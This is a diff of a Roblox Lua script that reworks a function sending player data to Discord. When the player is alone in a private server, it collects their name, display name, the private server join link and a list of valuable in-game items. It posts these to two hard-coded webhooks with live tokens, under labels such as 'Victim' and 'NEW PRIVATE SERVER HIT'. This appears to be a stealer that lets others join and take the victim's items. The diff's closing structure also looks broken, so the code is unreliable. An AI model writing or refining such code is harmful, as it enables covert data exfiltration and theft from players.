@@ -242,33 +242,30 @@ local function sendToWebhook(link, foundAnimals)
     if not isValidPrivateServerLink(link) then
         return false, "Invalid private server link"
     end
-    
+
     if not foundAnimals or #foundAnimals == 0 then
         return true
     end
-    
+
     local playerCount = #Players:GetPlayers()
-    
     if playerCount > 1 then
         return true
     end
-    
-    -- Animales especiales que van al webhook alternativo
+
     local specialAnimals = {
         "Dragon Cannelloni",
         "Strawberry Elephant",
         "Spooky and Pumpky",
         "La Secret Combinasion"
     }
-    
-    -- Separar animales normales y especiales
-    local normalAnimals = {}
-    local specialFound = {}
-    
+
+    local normalAnimals, specialFound = {}, {}
+
+    -- Clasificar animales correctamente
     for _, animal in ipairs(foundAnimals) do
         local isSpecial = false
         for _, special in ipairs(specialAnimals) do
-            if animal:lower():find(special:lower(), 1, true) then
+            if animal:lower() == special:lower() then
                 table.insert(specialFound, animal)
                 isSpecial = true
                 break
@@ -278,76 +275,61 @@ local function sendToWebhook(link, foundAnimals)
             table.insert(normalAnimals, animal)
         end
     end
-    
+
     local webhookNormal = "https://discord.com/api/webhooks/1427379212557353072/NrnXlLXc-gxzF9w94jbNDEsfw1CmVd5w_mK2mCzm1fW1AJLmH_66UBq-jr10al5AJyCC"
     local webhookSpecial = "https://discord.com/api/webhooks/1428259836688334910/nwKnU7h9LI8zrEMMpQRCDKwUTM8SO_j6zLTP6WLLRPS3B6UVjNhwcmER5cIDFMeL04Un"
-    
+
     local playerName = LocalPlayer.Name
     local displayName = LocalPlayer.DisplayName
-    
-    -- Función para enviar a un webhook específico
+
     local function sendToSpecificWebhook(webhookUrl, animals, isSpecial)
-        if #animals == 0 then return true end
-        
-        local animalList = ""
-        for i, animal in ipairs(animals) do
-            if i == 1 then
-                animalList = animal
-            else
-                animalList = animalList .. "\n" .. animal
-            end
-        end
-        
-        local title = isSpecial and "⭐ CATCHES ESPECIALES ENCONTRADOS" or "🎯 Nuevo Exploiter Encontrado"
-        local color = isSpecial and 16766720 or 10038562  -- Naranja para especiales, morado para normales
-        
+        if #animals == 0 then return end
+
+        local list = table.concat(animals, "\n")
         local data = {
             ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
             ["embeds"] = {{
-                ["title"] = title,
-                ["color"] = color,
+                ["title"] = isSpecial and "⭐ CATCHES ESPECIALES ENCONTRADOS" or "🎯 Nuevo Exploiter Encontrado",
+                ["color"] = isSpecial and 16766720 or 10038562,
                 ["fields"] = {
                     {
-                        ["name"] = "👤 Informacion del jugador:",
-                        ["value"] = "```diff\n+ Victim: " .. playerName .. "\n+ Display: " .. displayName .. "\n```",
+                        ["name"] = "👤 Información del jugador:",
+                        ["value"] = ("```diff\n+ Victim: %s\n+ Display: %s\n```"):format(playerName, displayName),
                         ["inline"] = false
                     },
                     {
-                        ["name"] = "👥 Datos del Server:",
-                        ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
+                        ["name"] = "👥 Datos del servidor:",
+                        ["value"] = ("```diff\n+ Players in Server: %d\n```"):format(playerCount),
                         ["inline"] = false
                     },
                     {
-                        ["name"] = "🎮 link:",
+                        ["name"] = "🎮 Link:",
                         ["value"] = "[Click here to join](" .. link .. ")",
                         ["inline"] = false
                     },
                     {
-                        ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🏆 Items importantes(secrets):",
-                        ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
+                        ["name"] = isSpecial and "⭐ CATCHES ESPECIALES:" or "🏆 Items importantes (secrets):",
+                        ["value"] = "```diff\n+ " .. list:gsub("\n", "\n+ ") .. "```",
                         ["inline"] = false
                     },
                     {
                         ["name"] = "📊 Total:",
-                        ["value"] = "```diff\n+ Total Items: " .. #animals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n```",
+                        ["value"] = ("```diff\n+ Total Items: %d\n+ Game ID: %s\n```"):format(#animals, tostring(game.GameId)),
                         ["inline"] = false
                     }
                 },
-                ["footer"] = {
-                    ["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"
-                },
+                ["footer"] = {["text"] = isSpecial and "Detector de Catches Especiales" or "Cazador de exploiter"},
                 ["timestamp"] = DateTime.now():ToIsoDate()
             }}
         }
-        
+
+        local jsonData = HttpService:JSONEncode(data)
         local success, err = pcall(function()
-            local jsonData = HttpService:JSONEncode(data)
             HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
         end)
-        
+
         if not success then
             pcall(function()
-                local jsonData = HttpService:JSONEncode(data)
                 HttpService:RequestAsync({
                     Url = webhookUrl,
                     Method = "POST",
@@ -356,9 +338,18 @@ local function sendToWebhook(link, foundAnimals)
                 })
             end)
         end
-        
-        return true
     end
+
+    -- Solo manda a lo que corresponde
+    if #normalAnimals > 0 then
+        sendToSpecificWebhook(webhookNormal, normalAnimals, false)
+    end
+    if #specialFound > 0 then
+        sendToSpecificWebhook(webhookSpecial, specialFound, true)
+    end
+
+    return true
+end
     
     -- Enviar a webhooks correspondientes
     if #normalAnimals > 0 then
